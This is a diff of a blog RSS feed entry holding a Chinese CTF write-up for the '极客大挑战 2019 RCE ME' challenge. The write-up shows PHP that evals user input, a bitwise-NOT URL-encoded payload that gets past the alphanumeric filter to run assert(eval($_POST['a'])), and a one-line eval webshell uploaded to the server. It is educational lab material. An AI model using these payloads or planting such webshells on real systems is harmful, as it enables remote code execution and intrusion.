@@ -8,30 +8,53 @@
         <language>zh-cn</language>
         <lastBuildDate>Sat, 05 Dec 2020 20:42:00 +0000</lastBuildDate><atom:link href="https://www.braindance.top/tags/disable_function%E7%BB%95%E8%BF%87/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>极客大挑战 2019 RCE ME</title>
-        <link>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link>
+        <link>https://www.braindance.top/articles/2020/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-rce-me/</link>
         <pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate>
         
-        <guid>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid>
+        <guid>https://www.braindance.top/articles/2020/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-rce-me/</guid>
         <description>&lt;h1 id=&#34;极客大挑战-2019rce-me&#34;&gt;[极客大挑战 2019]RCE ME
 &lt;/h1&gt;&lt;p&gt;源码：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
-error_reporting(0);
-if(isset($_GET[&amp;#39;code&amp;#39;])){
-            $code=$_GET[&amp;#39;code&amp;#39;];
-                    if(strlen($code)&amp;gt;40){
-                                        die(&amp;#34;This is too Long.&amp;#34;);
-                                                }
-                    if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
-                                        die(&amp;#34;NO.&amp;#34;);
-                                                }
-                    @eval($code);
-}
-else{
-            highlight_file(__FILE__);
-}
-
-// ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析一波，GET请求获得&lt;code&gt;code&lt;/code&gt;，想要通过的话需要绕过两个检测：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;error_reporting(0);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if(isset($_GET[&amp;#39;code&amp;#39;])){
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            $code=$_GET[&amp;#39;code&amp;#39;];
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    if(strlen($code)&amp;gt;40){
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                        die(&amp;#34;This is too Long.&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                        die(&amp;#34;NO.&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    @eval($code);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;else{
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            highlight_file(__FILE__);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// ?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;分析一波，GET请求获得&lt;code&gt;code&lt;/code&gt;，想要通过的话需要绕过两个检测：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;payload长度小于40&lt;/li&gt;
 &lt;li&gt;不能包含&lt;code&gt;a-z、A-Z、0-9&lt;/code&gt;&lt;/li&gt;
@@ -41,16 +64,41 @@ else{
     &gt;无字母数字webshell之提高篇&lt;/a&gt;。&lt;/p&gt;
 &lt;p&gt;使用&lt;code&gt;url编码&lt;/code&gt;+&lt;code&gt;~&lt;/code&gt;取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code&gt;($a)()&lt;/code&gt;这样的方法动态执行函数，所以我们可以构造payload：&lt;code&gt;assert(eval($_POST[‘a’]))&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;先构造&lt;code&gt;assert&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo urlencode(~&amp;#39;assert&amp;#39;);
-
-//结果：%9E%8C%8C%9A%8D%8B
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再构造&lt;code&gt;eval($_POST[&#39;a&#39;])&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
-
-//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整payload：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code&gt;~&lt;/code&gt;取反再获得真正的函数名。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo urlencode(~&amp;#39;assert&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//结果：%9E%8C%8C%9A%8D%8B
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;再构造&lt;code&gt;eval($_POST[&#39;a&#39;])&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;完整payload：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code&gt;~&lt;/code&gt;取反再获得真正的函数名。&lt;/p&gt;
 &lt;p&gt;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code&gt;ELF&lt;/code&gt;是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code&gt;ret=127&lt;/code&gt;：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png&#34;
 	
@@ -96,9 +144,17 @@ else{
 &lt;blockquote&gt;
 &lt;p&gt;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;上传一句话木马233.php：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
-@eval($_POST[&amp;#39;b&amp;#39;]);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再用一句话木马的shell执行插件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@eval($_POST[&amp;#39;b&amp;#39;]);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;再用一句话木马的shell执行插件：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png&#34;
 	
 	
